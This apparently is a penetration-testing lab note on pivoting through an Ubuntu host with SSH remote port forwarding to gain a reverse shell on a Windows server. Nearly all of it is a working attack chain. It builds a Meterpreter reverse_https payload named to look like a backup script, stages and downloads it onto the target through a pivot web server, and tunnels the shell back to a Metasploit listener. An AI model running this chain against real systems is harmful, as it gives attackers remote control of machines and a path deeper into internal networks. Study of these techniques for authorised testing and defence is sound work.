
# Remote/Reverse Port Forwarding with SSH

Scenario: A victim Windows server sits behind an Ubuntu pivot host, 10.129.15.50 and 172.16.5.129. Your attack host, 10.10.15.5 uses the Ubuntu machine to pivot to the Windows server.
The Window host has a limited outgoing connection to 172.16.5.0/23 because the Windows server does not have any direct connection with the attack host network. The attack host can gain
access via the Ubuntu server, using it as the pivot point, since it can connect to both the attack host and windows server. To gain a reverse shell on the Windows server you can:

1) Create a Meterpreter HTTPS payload via msfvenom using the Ubuntu server's IP address
2) Use port 8080 on the Ubuntu server to forward all reverse packets to your attackers host on port 8000, where the Metasploit listener is running

### Creating Windows Payload
```python
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

### Configure + Starting the multi/handler
```python
msf6 > use exploit/multi/handler
```

### Transferring Payload to Pivot Host
```python
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

### Starting Python3 Webserver on Pivot Host
```python
python3 -m http.server 8123
```

### Downloading Payload on Windows Target
```PowerShell
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### SSH Remote Port Forwarding
```python
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

>[!tip]
> -vN tells SSH to use verbose mode and not prompt for the login shell
> -R asks the Ubuntu server to listen on targetIPAddress:8080 and forward
> all incoming connections on port 8080 to your msfconsole listener on 0.0.0.0:8000

